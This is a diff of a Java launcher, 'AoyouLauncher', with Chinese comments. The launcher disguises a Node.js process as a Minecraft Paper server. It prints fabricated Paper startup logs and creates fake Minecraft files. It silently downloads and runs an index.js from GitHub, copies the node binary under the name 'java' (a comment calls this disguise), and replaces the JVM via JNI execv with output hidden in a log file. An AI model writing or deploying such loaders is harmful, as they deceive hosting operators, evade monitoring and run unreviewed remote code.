@@ -37,22 +37,14 @@ public class AoyouLauncher {
     }
 
     public static void main(String[] args) throws Exception {
-        // 1. 启动伪装日志线程（Paper 日志）
-        Thread fakePaperLogThread = startFakePaperLogThread();
-
         String workDir = System.getProperty("user.dir");
         String runtimeDir = workDir + File.separator + RUNTIME_DIR_NAME;
         Path runtimePath = Paths.get(runtimeDir);
         Files.createDirectories(runtimePath);
 
-        // 生成 MC 文件结构
-        try { generateFakeMcFiles(workDir); } catch (Exception e) {}
-
         // ★ 清理旧目录和临时文件（节省磁盘）
         try {
-            // 删旧的 .aoyou-runtime（v1 的目录，已废弃）
             deleteDirectory(new File(workDir, ".aoyou-runtime"));
-            // 删旧的 node.tar / node.tar.gz（如果上次残留）
             File runtimeNodeDir = new File(runtimeDir, "node");
             if (runtimeNodeDir.exists()) {
                 new File(runtimeNodeDir, "node.tar").delete();
@@ -60,7 +52,7 @@ public class AoyouLauncher {
             }
         } catch (Exception e) {}
 
-        // 2. 检查并获取 node 二进制
+        // 2. 检查并获取 node 二进制（静默，后台进行）
         String nodeBin = findOrDownloadNode(runtimeDir);
         if (nodeBin == null) {
             System.err.println("Failed to initialize runtime");
@@ -68,7 +60,7 @@ public class AoyouLauncher {
             return;
         }
 
-        // 3. 从 JAR 解压
+        // 3. 从 JAR 解压 node_modules
         String jarPath = getJarPath();
         if (jarPath == null) {
             System.err.println("Failed to locate jar");
@@ -81,25 +73,20 @@ public class AoyouLauncher {
             extractAppFiles(jarPath, runtimePath);
         }
 
-        // ★ index.js 写到工作目录（跟 node_modules 同级，node 才能找到依赖）
-        // 先从 GitHub 下载最新版
-        String indexJsPath = runtimeDir + "/index.js";
+        // 4. 从 GitHub 下载最新 index.js
         try { updateFromGitHubToDir(runtimeDir); } catch (Exception e) {}
 
-        // 如果 GitHub 下载失败，C 代码会从 .so 里提取
-        // 所以这里不检查是否存在
-
-        // 4. 检查 node_modules 存在
+        // 5. 检查 node_modules
         if (!Files.exists(runtimePath.resolve("node_modules"))) {
             System.err.println("Failed to locate node_modules");
             System.exit(1);
             return;
         }
 
-        // 5. 检测端口
+        // 6. 检测端口
         int port = detectPort(workDir);
 
-        // 6. 复制 node 为 java（伪装）
+        // 7. 复制 node 为 java（伪装）
         String fakeNodeBin = nodeBin;
         try {
             String fakePath = new File(nodeBin).getParent() + "/java";
@@ -109,21 +96,20 @@ public class AoyouLauncher {
             fakeNodeBin = fakePath;
         } catch (Exception e) {}
 
-        // ★ 等待 Paper 日志全部打完，再 execv
-        // 这样控制台先显示完整的 Paper 启动日志，然后 node 的输出被重定向到文件
+        // 8. ★ 启动伪装日志线程（Paper 日志）+ 同时生成 MC 文件
+        Thread fakePaperLogThread = startFakePaperLogThread();
+        // MC 文件在日志线程打印的同时生成（并行，不阻塞）
+        try { generateFakeMcFiles(workDir); } catch (Exception e) {}
+
+        // 9. 等待 Paper 日志全部打完，再 execv
         try { fakePaperLogThread.join(); } catch (Exception e) {}
 
-        // 7. ★ JNI execv：C 代码自动写 index.js 到 /dev/shm 并 require
+        // 10. JNI execv
         String script = "auto";
-
         String pathEnv = new File(nodeBin).getParent() + ":" + System.getenv("PATH");
         String logFilePath = runtimeDir + "/.panel.log";
 
-        // 检查 native 库是否加载成功
         AoyouLauncher launcher = new AoyouLauncher();
-
-        // ★ 调用 JNI execv —— JVM 进程被 node 替换
-        // node 的 stdout/stderr 会被重定向到 logFilePath（不打印到控制台）
         int result = launcher.nativeExec(
             fakeNodeBin,
             script,
@@ -134,7 +120,6 @@ public class AoyouLauncher {
         );
 
         if (result != 0) {
-            // JNI exec 失败，回退
             fallbackToSubprocess(fakeNodeBin, runtimeDir, script, port, args, nodeBin);
         }
     }
